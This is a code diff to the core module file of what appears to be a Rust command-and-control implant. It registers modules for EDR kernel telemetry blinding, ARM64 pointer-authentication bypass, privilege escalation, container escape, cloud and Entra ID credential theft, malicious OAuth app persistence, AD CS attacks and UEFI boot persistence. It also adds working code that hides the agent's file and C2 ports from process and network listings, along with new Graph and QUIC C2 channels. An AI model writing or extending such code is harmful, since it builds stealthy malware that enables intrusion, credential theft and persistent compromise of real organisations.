@@ -49,6 +49,12 @@ pub mod remote_assist;
 #[cfg(feature = "hci-research")]
 pub mod hci_logging;
 
+// Automated internal reconnaissance: AD enumeration, attack path discovery,
+// cloud fingerprinting, and credential attack automation.
+// Gated behind `recon` feature flag.  Windows-only.
+#[cfg(all(windows, feature = "recon"))]
+pub mod recon;
+
 pub mod syscalls;
 
 #[cfg(all(windows, not(feature = "syscall-emulation")))]
@@ -61,8 +67,9 @@ macro_rules! emulated_syscall {
 
 // Unwind-aware call-stack spoofing database and chain generator.
 // Provides multi-frame plausible call graph chains for the NtContinue-based
-// stack-spoof path in syscalls.rs.  Gated behind `stack-spoof` + x86_64.
-#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+// stack-spoof path in syscalls.rs.  Gated behind `stack-spoof`.
+// Supports both x86_64 and aarch64 Windows targets.
+#[cfg(all(windows, feature = "stack-spoof"))]
 pub mod stack_db;
 
 // Indirect-syscall stack spoofing with synthetic multi-frame call chains.
@@ -210,6 +217,21 @@ pub mod kernel_callback;
 #[cfg(all(windows, feature = "kernel-callback"))]
 pub mod kernel_arg_spoof;
 
+// ETW-Ti (Event Tracing for Windows — Threat Intelligence) kernel bypass:
+// nullifies ETW-Ti provider callbacks at the kernel level using BYOVD driver
+// kernel memory read/write primitives.  ETW-Ti is a set of kernel telemetry
+// providers (process/thread/image-load/registry/file-io/network) that deliver
+// events directly from kernel sensor callbacks to EDR products, bypassing
+// userland ETW patching.  This module resolves the ETW-Ti provider registration
+// table in ntoskrnl, walks each provider's callback chain, and overwrites
+// callback pointers to point to a `ret` instruction (non-NULL, passes EDR
+// self-integrity checks).  Build-specific offset tables for Windows 10 1809+
+// through Windows 11 24H2.  Saves original pointers for clean restoration.
+// Cross-architecture (x86_64 and aarch64).  Requires the kernel-callback
+// feature (BYOVD driver deployed).  Windows-only.
+#[cfg(all(windows, feature = "kernel-callback"))]
+pub mod etw_ti_bypass;
+
 // Automated EDR bypass transformation engine: scans the agent's own .text
 // section for byte signatures known to be detected by EDR (YARA rules, entropy
 // heuristics, known gadget chains like "4C 8B D1 B8" for direct syscall stubs).
@@ -218,8 +240,12 @@ pub mod kernel_arg_spoof;
 // insertion, constant splitting, jump obfuscation.  Supplements self-reencode
 // (handles pattern avoidance before and after morphing).  Gated by
 // `evasion-transform` (implies `self-reencode`).
-#[cfg(feature = "evasion-transform")]
+#[cfg(all(feature = "evasion-transform", target_arch = "x86_64"))]
 pub mod edr_bypass_transform;
+#[cfg(all(feature = "evasion-transform", target_arch = "aarch64"))]
+pub mod edr_bypass_transform_aarch64;
+#[cfg(all(feature = "evasion-transform", target_arch = "aarch64"))]
+pub use edr_bypass_transform_aarch64 as edr_bypass_transform;
 
 // NTFS transaction-based process hollowing with ETW blinding: creates an
 // NTFS transaction, writes payload into a transaction-backed section,
@@ -272,7 +298,8 @@ pub mod syscall_emulation;
 // Integrates with the existing stack-spoofing code in syscalls.rs by adding
 // a CET-awareness check at the entry point of spoof_call.  Windows-only,
 // gated by `cet-bypass` feature flag (implies `direct-syscalls`).
-#[cfg(all(windows, feature = "cet-bypass"))]
+// x86-64 only: CET, WRSS, and shadow-stack manipulation are Intel-specific.
+#[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]
 pub mod cet_bypass;
 
 // Shadow Stack Forging for Intel CET: proactively forges entries on the
@@ -288,7 +315,7 @@ pub mod cet_bypass;
 //       forge/restore shadow stack entries around every spoofed call.
 // Gracefully degrades when CET is not available (no-op).  Windows x86_64
 // only, gated by `cet-bypass` feature flag.
-#[cfg(all(windows, feature = "cet-bypass"))]
+#[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]
 pub mod shadow_stack_forge;
 
 // Indirect Branch Tracking (IBT) Bypass for Intel CET: scans clean-mapped
@@ -310,8 +337,26 @@ pub mod shadow_stack_forge;
 //       through an ENDBR64 gadget instead of directly to the API.
 // Gracefully degrades when IBT is not active (uses existing spoof_call).
 // Windows x86_64 only, gated by `cet-bypass` feature flag.
-#[cfg(all(windows, feature = "cet-bypass"))]
+#[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]
 pub mod ibt_bypass;
+
+// ARM64 BTI/PAC (Branch Target Identification / Pointer Authentication Code)
+// bypass.  ARM64 Windows uses PAC to cryptographically sign return addresses
+// with 128-bit keys (QARMA5 algorithm) — significantly harder to bypass than
+// Intel CET shadow stacks.  Strategies:
+//   (1) PAC-valid trampoline routing — route calls through system DLL functions
+//       that already perform PACIASP/AUTIASP in their prologue/epilogue,
+//       piggy-backing on their legitimate PAC flow.
+//   (2) PAC key extraction via BYOVD — extract 128-bit PAC keys from the
+//       KTHREAD structure using a deployed vulnerable driver, then use PACIA
+//       inline assembly to sign our own pointers.
+//   (3) BTI gadget scanning — find BTI instructions in system DLLs that serve
+//       as valid indirect branch targets, building a gadget database for
+//       call routing (analogous to ENDBR64 scanning on x86-64).
+// Gracefully degrades when PAC is not available (no-op).
+// Windows ARM64 only, gated by `pac-bypass` feature flag (implies direct-syscalls).
+#[cfg(all(windows, feature = "pac-bypass", target_arch = "aarch64"))]
+pub mod bti_pac_bypass;
 
 // Exception-based SSN resolution (Tartarus' Gate): resolves NT syscall numbers
 // via a VEH handler that fires on access violations, reading the SSN from
@@ -319,8 +364,9 @@ pub mod ibt_bypass;
 // ntdll hooks without reading the .text section or mapping a clean ntdll.
 // Two strategies: (1) direct hook-chain walking (no exception), (2) VEH-based
 // exception handler that catches STATUS_ACCESS_VIOLATION on hooked stubs.
-// Windows-only, gated by `direct-syscalls` feature flag.
-#[cfg(all(windows, feature = "direct-syscalls"))]
+// Windows-only, gated by `direct-syscalls` feature flag.  x86-64 only: the
+// VEH-based hook-chain walker uses x86-64 instruction patterns and CONTEXT layout.
+#[cfg(all(windows, feature = "direct-syscalls", target_arch = "x86_64"))]
 pub mod exception_ssn;
 
 // SEH-based anti-debugging: constructs deeply nested, valid VEH handler chains
@@ -376,7 +422,9 @@ pub mod kernel_apc_pivot;
 // function pointer to always return TRUE.  Integrates with spoof_call and
 // clean_call! to promote target addresses before indirect calls.
 // Windows-only, gated by `cfg-bypass` feature flag (implies `direct-syscalls`).
-#[cfg(all(windows, feature = "cfg-bypass"))]
+// x86-64 only: scans for x86-64 indirect-call gadgets (call rax, call r10, etc.)
+// and uses x86-64 inline assembly for CFG bit-set manipulation.
+#[cfg(all(windows, feature = "cfg-bypass", target_arch = "x86_64"))]
 pub mod cfg_bypass;
 
 // Token-only impersonation via NtImpersonateThread / SetThreadToken:
@@ -390,6 +438,43 @@ pub mod cfg_bypass;
 // (implies `direct-syscalls`).
 #[cfg(all(windows, feature = "token-impersonation"))]
 pub mod token_impersonation;
+
+// Local Privilege Escalation: automated SYSTEM token acquisition via token
+// theft, named pipe impersonation, and Print Spooler exploitation.
+// Tries multiple techniques in order, returns first success.
+// Windows-only, gated by `lpe` feature flag (implies `direct-syscalls`).
+#[cfg(all(windows, feature = "lpe"))]
+pub mod lpe;
+
+// Container escape, cloud metadata credential theft, and cloud IAM lateral
+// movement.  Detects container type (Docker/Podman/K8s/LXC), checks privilege
+// level, attempts escape via cgroup release_notification, device mount, and
+// mount propagation.  Queries AWS/Azure/GCP IMDS for temporary credentials.
+// Uses stolen credentials to enumerate cloud resources.  Reads K8s SA tokens.
+// Linux-only, gated by `container-escape` feature (implies `direct-syscalls`).
+#[cfg(all(target_os = "linux", feature = "container-escape"))]
+pub mod container;
+
+// macOS post-exploitation: TCC bypass (database manipulation, synthetic
+// click via CoreGraphics, vulnerable process delegation), SIP status
+// assessment (csrutil, NVRAM, capability enumeration), XPC service
+// discovery and privilege escalation abuse (Mach messaging), Keychain
+// credential dump (SecItemCopyMatching), and Secure Enclave key
+// enumeration.  Uses raw FFI to Apple frameworks — no external crate
+// dependencies.  macOS-only, gated by `macos-postexp` feature flag.
+#[cfg(all(target_os = "macos", feature = "macos-postexp"))]
+pub mod macos_postexp;
+
+// Hardware-level persistence and attack: Thunderbolt/DMA controller
+// detection (sysfs / SetupAPI), DMA vulnerability assessment (security
+// level, IOMMU/VT-d, kernel DMA protection), DMA payload generation,
+// physical memory read via BYOVD, VBR/boot-sector persistence (Legacy
+// BIOS), UEFI boot persistence (ESP driver, NVRAM boot entries), and
+// boot-level artifact detection/removal.  All disk modifications are
+// backed up and verified by read-back.  Cross-platform (Linux + Windows).
+// Gated by `hardware-persistence` feature flag.
+#[cfg(feature = "hardware-persistence")]
+pub mod hardware_persistence;
 
 // Adaptive C2 timing: learns the target network's traffic patterns and
 // adjusts callback timing to blend in with observed traffic.  Replaces
@@ -541,6 +626,42 @@ pub mod vss_pivot;
 // APIs needed).  Gated by `entra-ptc` feature flag (implies `ring`).
 #[cfg(feature = "entra-ptc")]
 pub mod entra_ptc;
+
+// Entra ID / Azure AD credential attack capabilities: PRT theft (browser
+// cookies, DPAPI, WAM, CloudAP), Pass-the-Certificate (RS256 JWT assertion),
+// Golden SAML (AD FS token-signing key), and token utilization (Graph, ARM,
+// Key Vault).  PRT extraction does not require Domain Admin or LSASS access —
+// the PRT is stored in user-accessible credential stores.  Tokens are held in
+// memory only.  Cross-platform (Entra ID is cloud-based), but PRT theft and
+// AD FS key extraction are Windows-only.  Gated by `entra-attacks` feature
+// flag (implies `ring` for RSA signing + `entra-ptc` for shared types).
+#[cfg(feature = "entra-attacks")]
+pub mod entra_attacks;
+
+// Entra ID OAuth application abuse: register malicious applications in a
+// compromised Azure AD tenant, grant them high-privilege Microsoft Graph API
+// permissions (Mail.Read, Files.Read.All, Directory.Read.All, RoleManagement.
+// ReadWrite.Directory), add client secrets (encrypted via HKDF — never stored
+// in plaintext), authenticate via the OAuth2 client-credentials flow for
+// persistent password-free access that bypasses MFA, enumerate the full tenant
+// (users, groups, apps, roles), read all mailboxes and OneDrive files, and
+// elevate users to Global Admin.  Cross-platform (cloud API via reqwest).
+// Gated by `entra-app-abuse` feature flag (implies `entra-ptc` for shared
+// Graph API types: CloudEnvironment, TokenResponse, GraphUser, etc.).
+#[cfg(feature = "entra-app-abuse")]
+pub mod entra_app_abuse;
+
+// Active Directory Certificate Services (AD CS) attack capabilities:
+// ESC1-ESC8 enumeration and exploitation patterns.  Includes LDAP-based
+// discovery of CAs and templates, static vulnerability detection, certificate
+// requests via certreq.exe (temp CSR files cleaned up immediately), and
+// PKINIT Kerberos authentication with the obtained certificate.  Certificate-
+// based attacks survive password resets.  Requires the agent to run in a
+// domain-joined Windows environment with LDAP access to a domain controller.
+// All issued certificates are held in memory only.  Windows-only, gated by
+// `adcs-attacks` feature flag.
+#[cfg(all(windows, feature = "adcs-attacks"))]
+pub mod adcs_attacks;
 
 // WMI permanent event subscriptions with encrypted cloud payloads.
 // Installs the WMI persistence triad (EventFilter, EventConsumer,
@@ -849,7 +970,7 @@ impl Agent {
         // injection or stack-spoofing operations that manipulate return
         // addresses.  Detects the current CET state and configures the
         // appropriate bypass strategy (policy disable, call chain, or VEH).
-        #[cfg(all(windows, feature = "cet-bypass"))]
+        #[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]
         {
             let cfg = self.config.read().await;
             crate::cet_bypass::init_from_config(&cfg.cet_bypass);
@@ -857,6 +978,23 @@ impl Agent {
                 "cet_bypass: initialised (enabled={}, state={})",
                 cfg.cet_bypass.enabled,
                 crate::cet_bypass::cet_state(),
+            );
+        }
+
+        // Initialise BTI/PAC bypass for ARM64.  ARM64 Windows uses
+        // cryptographic pointer authentication (QARMA5 with 128-bit keys)
+        // to sign return addresses — significantly harder to bypass than
+        // Intel CET.  This MUST happen before any injection or
+        // stack-spoofing operations.  Strategies: trampoline routing,
+        // BYOVD key extraction.
+        #[cfg(all(windows, feature = "pac-bypass", target_arch = "aarch64"))]
+        {
+            let cfg = self.config.read().await;
+            crate::bti_pac_bypass::init_from_config(&cfg.bti_pac);
+            log::info!(
+                "bti_pac_bypass: initialised (enabled={}, state={})",
+                cfg.bti_pac.enabled,
+                crate::bti_pac_bypass::pac_state_str(),
             );
         }
 
@@ -889,8 +1027,76 @@ impl Agent {
         #[cfg(all(target_os = "linux", feature = "ebpf"))]
         {
             let pid = std::process::id();
-            let patterns: Vec<&str> = Vec::new(); // TODO: wire to config
-            let ports: Vec<u16> = Vec::new(); // TODO: wire to transport ports
+
+            // Derive file patterns: hide the agent binary filename and the
+            // sysd config directory name so ps/ls cannot discover the agent.
+            let mut pattern_strings: Vec<String> = Vec::new();
+            if let Some(filename) = std::env::current_exe()
+                .ok()
+                .as_ref()
+                .and_then(|p| p.file_name())
+                .and_then(|n| n.to_str())
+                .map(str::to_string)
+            {
+                pattern_strings.push(filename);
+            }
+            // Hide the sysd config directory entry from getdents64 results.
+            pattern_strings.push("sysd".to_string());
+
+            // Collect transport ports from the active configuration so that
+            // outbound connections are not visible in netstat/ss output.
+            let ports: Vec<u16> = {
+                let cfg = self.config.read().await;
+                let mp = &cfg.malleable_profile;
+                let mut v: Vec<u16> = Vec::new();
+
+                // SSH transport port.
+                if mp.ssh_host.is_some() {
+                    v.push(mp.ssh_port.unwrap_or(22));
+                }
+
+                // SMB named-pipe TCP relay port.
+                if mp.smb_pipe_enabled {
+                    if let Some(p) = mp.smb_tcp_relay_port {
+                        v.push(p);
+                    }
+                }
+
+                // QUIC transport port.
+                if mp.c2_quic.enabled {
+                    v.push(mp.c2_quic.port);
+                }
+
+                // HTTP / TLS / DoH: extract the port from the configured C2
+                // endpoint URL so those connections are hidden from netstat.
+                let endpoint_url: &str = if let Some(ref doh) = mp.doh_server_url {
+                    doh.as_str()
+                } else if !mp.direct_c2_endpoint.is_empty() {
+                    mp.direct_c2_endpoint.as_str()
+                } else {
+                    ""
+                };
+                if !endpoint_url.is_empty() {
+                    let without_scheme = endpoint_url
+                        .trim_start_matches("https://")
+                        .trim_start_matches("http://");
+                    let host_port = without_scheme.split('/').next().unwrap_or("");
+                    let default_port: u16 =
+                        if endpoint_url.starts_with("http://") { 80 } else { 443 };
+                    let port = host_port
+                        .rsplit_once(':')
+                        .and_then(|(_, p)| p.parse::<u16>().ok())
+                        .unwrap_or(default_port);
+                    v.push(port);
+                }
+
+                v.sort_unstable();
+                v.dedup();
+                v
+            };
+
+            let patterns: Vec<&str> =
+                pattern_strings.iter().map(String::as_str).collect();
             let _ebpf_mgr = crate::ebpf_evasion::init(pid, &patterns, &ports);
             // ebpf_mgr is dropped when the scope ends, which would detach
             // programs.  For persistent evasion, the manager must be stored
@@ -1438,3 +1644,7 @@ pub mod obfuscated_sleep;
 pub mod c2_doh;
 #[cfg(any(feature = "http-transport", feature = "doh-transport"))]
 pub mod c2_http;
+#[cfg(feature = "graph-transport")]
+pub mod c2_graph;
+#[cfg(feature = "quic-transport")]
+pub mod c2_quic;
